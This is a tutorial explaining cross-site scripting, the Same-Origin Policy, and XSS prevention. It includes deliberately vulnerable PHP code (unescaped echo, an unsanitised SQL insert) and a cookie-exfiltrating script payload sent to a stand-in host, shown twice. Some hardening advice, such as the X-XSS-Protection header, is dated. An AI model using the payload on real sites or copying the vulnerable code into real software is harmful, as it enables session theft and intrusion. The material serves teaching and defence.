## **What is XSS (Cross-Site Scripting)?**  

**Cross-Site Scripting (XSS)** is a type of web security vulnerability that allows attackers to inject **malicious scripts** (usually JavaScript) into **trusted websites**. These scripts run in the context of the victim's browser and can be used to steal **cookies, session tokens, or sensitive information**, and even impersonate the user.  

### **Types of XSS Attacks**
1. **Stored XSS (Persistent XSS)**  
   - The malicious script is permanently stored on the website (e.g., in a database or forum post).  
   - Example: A hacker injects a script into a comment section, and every user who views the comment executes the script.  

2. **Reflected XSS**  
   - The malicious script is included in a URL and executed when the victim **clicks the link**.  
   - Example: A phishing email contains a crafted URL that, when opened, runs malicious JavaScript.  

3. **DOM-based XSS**  
   - The attack manipulates the webpage’s **Document Object Model (DOM)** without sending malicious content to the server.  
   - Example: A JavaScript function reads URL parameters and inserts them into the page without proper sanitization.  

---

## **What is SOP (Same-Origin Policy) and its Relationship with XSS?**  

**Same-Origin Policy (SOP)** is a **security mechanism** implemented in web browsers to **prevent websites from interacting with resources from different origins** (protocol, domain, and port must match).  

### **How SOP Works**
- A webpage from `https://example.com` **cannot** access cookies, local storage, or API responses from `https://evil.com`.  
- This helps **prevent malicious sites** from reading sensitive data from another website.  

### **XSS vs. SOP: The Relationship**
✅ **SOP protects against cross-origin attacks**, but **XSS bypasses SOP** by injecting scripts into the trusted origin itself.  

- SOP **blocks malicious scripts from different origins** (e.g., `evil.com` cannot directly steal data from `bank.com`).  
- However, **XSS exploits a vulnerability within the same origin** (e.g., `bank.com` itself loads an attacker’s script).  

### **Example of SOP Failing Against XSS**
1. A user visits `https://trusted.com`, which follows SOP rules.  
2. The website has an **XSS vulnerability** in its comment section.  
3. An attacker injects `<script>fetch('https://evil.com/steal?data=' + document.cookie);</script>`.  
4. The script **executes in the victim’s browser on `trusted.com`** and steals the user's session cookie.  
5. SOP does **not** protect against this because the script runs **within the same origin (`trusted.com`)**.  

---

## **How to Prevent XSS Attacks?**
✅ **Use Content Security Policy (CSP)**  
   - Restrict allowed script sources (e.g., only from the same domain).  

✅ **Sanitize User Input**  
   - Remove or encode dangerous characters (`<`, `>`, `"`).  

✅ **Use Secure HTTP Headers**  
   - `X-XSS-Protection: 1; mode=block`  
   - `Content-Security-Policy: script-src 'self'`  

✅ **Use Output Encoding**  
   - Convert user input into safe HTML entities (`<script>` → `&lt;script&gt;`).  

✅ **Validate User Input**  
   - Only allow expected input formats (e.g., numbers, emails).


### **XSS Exploitation & Prevention: Practical Examples**  

**how an attacker exploits XSS** and **how to prevent it** in a web application.

---

## **1. Exploiting XSS (Reflected & Stored XSS)**
### **Reflected XSS Example**
- Consider a vulnerable search bar in a web application:
  ```html
  <form action="search.php" method="GET">
      <input type="text" name="q" placeholder="Search...">
      <input type="submit" value="Search">
  </form>
  ```
- The server processes the search query and displays it:
  ```php
  <?php
      $query = $_GET['q'];  
      echo "Search results for: " . $query;  
  ?>
  ```
- If a user enters `<script>alert('Hacked!')</script>`, the page **renders it as HTML**, leading to an XSS attack.

✅ **Attacker’s Exploit:**  
- The attacker crafts a malicious URL:  
  ```
  https://victim.com/search.php?q=<script>alert('Hacked!')</script>
  ```
- If the victim **clicks the link**, their browser executes the script, displaying a pop-up (`alert('Hacked!')`).

---

### **Stored XSS Example**
1. **Vulnerable Comment System**
   ```php
   <?php
       $comment = $_POST['comment'];
       // Insert into the database (No sanitization)
       $sql = "INSERT INTO comments (text) VALUES ('$comment')";
       $conn->query($sql);
   ?>
   ```
2. **Attacker Posts a Malicious Comment**
   ```
   <script>fetch('https://evil.com/steal?data='+document.cookie)</script>
   ```
3. **Whenever another user visits the page, the script executes, stealing their session cookies.**

---

## **2. Preventing XSS Attacks**
### **✅ Using Output Encoding**
- Convert special characters into **safe HTML entities** to prevent scripts from executing:
  ```php
  <?php
      $query = htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8');
      echo "Search results for: " . $query;
  ?>
  ```
  **Now, `<script>alert('XSS')</script>` is displayed as text, not executed.**

---

### **✅ Using Prepared Statements (for Stored XSS Prevention)**
- Prevent SQL Injection **and** XSS by using **prepared statements**:
  ```php
  <?php
      $stmt = $conn->prepare("INSERT INTO comments (text) VALUES (?)");
      $stmt->bind_param("s", htmlspecialchars($_POST['comment'], ENT_QUOTES, 'UTF-8'));
      $stmt->execute();
  ?>
  ```

---

### **✅ Using Content Security Policy (CSP)**
- CSP prevents the browser from executing unauthorized scripts:
  ```http
  Content-Security-Policy: default-src 'self'; script-src 'self'
  ```
- This blocks **inline JavaScript** and external scripts not hosted on the same domain.

---

### **✅ Using HTTP Security Headers**
- Add security headers to prevent **XSS execution**:
  ```http
  X-XSS-Protection: 1; mode=block
  Content-Security-Policy: script-src 'self'
  ```
  This tells the browser to **block XSS attempts automatically**.

---

## **3. Testing for XSS (Tools)**
Here are tools used for testing XSS vulnerabilities:
🔹 **Burp Suite** – Intercept HTTP requests and modify parameters.  
🔹 **OWASP ZAP** – Automated scanning for XSS.  
🔹 **Google XSS Playground** – Safe environment to practice XSS attacks.  

---

### **Conclusion**
✅ **XSS bypasses the Same-Origin Policy (SOP) by executing scripts within the same trusted site.**  
✅ **To prevent XSS, always sanitize user input, use CSP, and apply security headers.**  
✅ **Testing with tools like Burp Suite and OWASP ZAP helps detect vulnerabilities.**  

